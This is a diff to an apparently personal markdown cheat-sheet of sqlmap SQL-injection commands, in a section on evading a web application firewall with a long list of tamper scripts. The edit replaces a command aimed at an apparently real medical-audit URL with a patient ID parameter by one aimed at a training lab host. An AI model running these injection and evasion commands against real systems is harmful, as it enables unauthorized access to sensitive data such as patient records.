@@ -154,9 +154,7 @@ sqlmap -u 'http://demo.ine.local/index.php?page=login.php' --data="username=ss&p
 ## Attempts to bypass a WAF
 
 ```bash
-sqlmap -u 'https://cosabog06xz036.colmedica.com/COAP09/Sahos/IniciarAuditoria?idPaciente=70753&numeroContrat
-o=F239103557348CC0035335123&idAuditoria=0&editarAuditoria=
-False' -p idPaciente --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,
+sqlmap -u 'http://demo.ine.local/index.php?page=login.php' -p page --threads 10 --cookie="cookie=value" --level=2 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,
 equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,
 unionalltounion,unmagicquotes
 ```
